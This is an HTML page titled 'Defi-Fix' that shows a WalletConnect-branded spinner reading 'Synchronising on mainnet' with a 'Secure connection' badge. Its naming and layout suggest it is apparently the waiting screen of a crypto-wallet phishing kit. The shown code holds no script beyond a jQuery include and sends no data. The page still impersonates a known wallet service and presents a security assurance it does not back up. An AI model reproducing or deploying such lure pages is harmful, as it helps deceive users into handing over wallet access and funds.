<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Defi-Fix</title>
    <link rel="icon" href="../Defi-Fix Logo.png" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <style>
        :root {
            --color-background: #0a0e27;
            --color-text: #e4e7eb;
            --color-text-muted: #a0a9b8;
            --color-success: rgba(74, 222, 128, 0.15);
            --color-border: rgba(255, 255, 255, 0.08);
        }
        * {
            margin:0;
            padding:0;
            box-sizing: border-box;
        }
        html, body { height:100%; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0f1229 100%);
            color: var(--color-text);
            display:flex;
            align-items:center;
            justify-content:center;
            padding:20px;
        }
        .page-wrapper {
            width:100%;
            max-width:480px;
            text-align:center;
        }
        .logo {
            display:inline-flex;
            align-items:center;
            gap:8px;
            margin-bottom:32px;
            color:var(--color-text);
            text-decoration:none;
            font-size:18px;
            font-weight:600;
        }
        .logo img { height:30px; }
        .card {
            background: rgba(74,222,128,0.1);
            border:1px solid rgba(74,222,128,0.3);
            border-radius:24px;
            padding:32px;
            backdrop-filter: blur(8px);
            margin-bottom:32px;
        }
        .card .title {
            font-size:20px;
            font-weight:600;
            color:#4ade80;
            margin-bottom:12px;
        }
        .card .message {
            font-size:14px;
            color:var(--color-text);
        }
        .spinner {
            width: 72px;
            height: 72px;
            margin: 0 auto 24px;
            animation: spin 1s linear infinite;
            color: rgba(102,177,255,0.8);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .security-badge {
            display:inline-flex;
            align-items:center;
            gap:8px;
            margin-top:24px;
            padding:12px 16px;
            background: rgba(102,177,255,0.1);
            border:1px solid var(--color-border);
            border-radius:12px;
            font-size:12px;
            color: rgba(102,177,255,0.9);
            font-weight:500;
            text-transform:uppercase;
            letter-spacing:0.5px;
        }
        .security-badge svg { width:14px; height:14px; opacity:0.8; }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <a href="../index.html" class="logo">
            <img src="../assets/images/wc1.png" alt="Logo">
            Walletconnect
        </a>
        <div class="card">
            <div class="spinner">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" opacity="0.2"></circle>
                    <path d="M22 12a10 10 0 00-10-10" stroke="currentColor" stroke-width="4" stroke-linecap="round"></path>
                </svg>
            </div>
            <div class="title">Synchronising on mainnet</div>
            <div class="message">Please wait – this one‑time connection may take a moment.</div>
        </div>
        <div class="security-badge">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
            Secure connection
        </div>
    </div>
</body>
</html>
